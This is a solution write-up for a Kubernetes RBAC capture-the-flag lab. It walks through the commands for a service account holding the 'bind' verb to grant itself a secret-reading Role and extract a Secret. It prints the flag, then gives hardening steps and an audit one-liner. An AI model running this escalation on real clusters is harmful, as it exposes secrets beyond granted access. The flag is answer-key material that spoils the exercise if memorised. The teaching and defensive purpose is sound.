# Solution — Bind Thyself Admin

The flag is `KUBE{bind_verb_is_privilege_escalation}`. Below is the full escalation as `dev`, the common failure modes you'll hit, and the hardening that makes every path dead-end.

Set your impersonation target once so every command reads cleanly:

```bash
DEV=system:serviceaccount:dojo-esc:dev
```

## Step 1 — recon: prove you can't read the Secret (yet)

Audit the identity before touching it — this is the attacker's map and your audit tool, the same API from opposite sides:

```bash
kubectl auth can-i --list -n dojo-esc --as=$DEV
```

You'll see `rolebindings [create get list]` and `roles.rbac.authorization.k8s.io [bind]`, but **no** `secrets`. Confirm the two facts that define the puzzle:

```bash
kubectl auth can-i get secrets        -n dojo-esc --as=$DEV   # -> no   (the wall)
kubectl auth can-i create rolebindings -n dojo-esc --as=$DEV  # -> yes  (the key)
```

A subject that can `create rolebindings` but not read Secrets is not safe — it is one API call away from reading them.

## Step 2 — escalate: bind `secret-reader` to yourself

Create a RoleBinding, **as `dev`**, that grants the pre-existing `secret-reader` Role to `dev`:

```bash
kubectl -n dojo-esc create rolebinding dev-self-escalation \
  --role=secret-reader \
  --serviceaccount=dojo-esc:dev \
  --as=$DEV
# rolebinding.rbac.authorization.k8s.io/dev-self-escalation created
```

Why the API server allows this even though `dev` can't read Secrets: the escalation-prevention check passes via **route #2** — `dev` holds `bind` on the `secret-reader` Role (scoped by `resourceNames: ["secret-reader"]` in the `binder` Role). `bind` is the explicit "you may delegate this Role even though you don't hold its permissions" grant. That is the bug the platform team planted when they added `bind` "just to make it work."

Confirm the wall just fell:

```bash
kubectl auth can-i get secrets -n dojo-esc --as=$DEV   # -> yes  (it wasn't, 10 seconds ago)
```

## Step 3 — collect the flag

```bash
kubectl -n dojo-esc get secret crown-jewels \
  -o jsonpath='{.data.FLAG}' --as=$DEV | base64 -d; echo
# -> KUBE{bind_verb_is_privilege_escalation}
```

Decode every key to see the decoy too:

```bash
kubectl -n dojo-esc get secret crown-jewels -o go-template='
{{- range $k, $v := .data }}{{ $k }}: {{ $v | base64decode }}{{ "\n" }}{{ end }}' --as=$DEV
```

## Variant — escalate via a raw manifest (when `kubectl create` isn't handy)

`kubectl create rolebinding` is sugar; the real primitive is a POST to the RBAC API. This is what the same attack looks like from a pod with only the API reachable:

```bash
cat <<'YAML' | kubectl apply --as=$DEV -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-self-escalation
  namespace: dojo-esc
subjects:
  - kind: ServiceAccount
    name: dev
    namespace: dojo-esc
roleRef:
  kind: Role
  name: secret-reader
  apiGroup: rbac.authorization.k8s.io
YAML
```

## Common failure modes

| What you see | Cause | Fix |
|--------------|-------|-----|
| `rolebindings.rbac.authorization.k8s.io is forbidden ... cannot create ... user "..." : requires "bind" ...` | You dropped `--as=$DEV`, or the `binder` Role lost its `bind` rule | Re-run `setup.sh`; ensure `--as=$DEV` is on the `create`/`apply` |
| `forbidden: user ... cannot impersonate resource "serviceaccounts"` | Your *own* kubeconfig can't impersonate (not cluster-admin) | Use the `kind-dojo` admin context: `kubectl config use-context kind-dojo` |
| `create` succeeds but `get secrets` still says `no` | RBAC caches briefly; or the binding named the wrong subject/role | Wait a second and retry; check `kubectl -n dojo-esc get rolebinding dev-self-escalation -o yaml` |
| Flag decodes to `decoy-not-the-flag` | You read `.data.DB_PASSWORD`, not `.data.FLAG` | Target `{.data.FLAG}` |

> **War story.** A team I reviewed had a GitOps controller whose ServiceAccount was granted `create`/`patch` on `rolebindings` cluster-wide so it could "reconcile access from Git." No one had granted it `cluster-admin`, so the quarterly access review passed — the audit script only flagged subjects *bound* to admin roles. But the controller could bind **any** ClusterRole to **itself**, including `cluster-admin`, in one reconcile loop. Latent privilege is invisible to a review that only looks at current bindings. We now diff for the four escalation verbs (`bind`, `escalate`, `impersonate`, and writes to RBAC objects) as a separate, louder check — a subject holding any of them is treated as already holding whatever it can reach.

## The defense — never hand out `bind`/`escalate`

The root cause is a single over-broad grant. Close it:

1. **Don't grant `bind` (or `escalate`) to workload or CI identities.** They exist for a human admin or a tightly-trusted controller, not for "manage your own access." If a subject legitimately needs to grant a Role, prefer a narrow, reviewed, out-of-band process over a standing `bind`.

2. **Don't grant write access to RBAC objects broadly.** `create`/`update`/`patch` on `rolebindings`/`roles`/`clusterrolebindings`/`clusterroles` is self-escalation by another name. Scope it hard, or keep it with humans.

3. **If a subject must create bindings, strip the `bind` verb** so Kubernetes' escalation check (route #1) applies — it can then only grant permissions it already holds, which bounds the blast radius to what it was already trusted with.

```yaml
# The 'binder' Role, de-fanged: it can still create bindings, but WITHOUT the
# `bind` verb the API server only lets it grant permissions dev already has —
# and dev has none worth stealing. The escalation disappears.
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: binder
  namespace: dojo-esc
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["rolebindings"]
    verbs: ["create", "get", "list"]
  # NOTE: the `roles: [bind]` rule is deleted.
```

4. **Audit for the loaded verbs continuously.** This one-liner surfaces every Role in a namespace that grants a self-escalation verb:

```bash
kubectl -n dojo-esc get roles -o json \
  | grep -E '"bind"|"escalate"|"impersonate"' && echo "^ review these grants"
```

Verify the fix: after deleting the `bind` rule and the escalation RoleBinding, re-run the attack and it dead-ends at Step 2 with `forbidden ... requires "bind"`. That `forbidden` is the control working — the challenge becomes unsolvable as `dev`. That's the win.
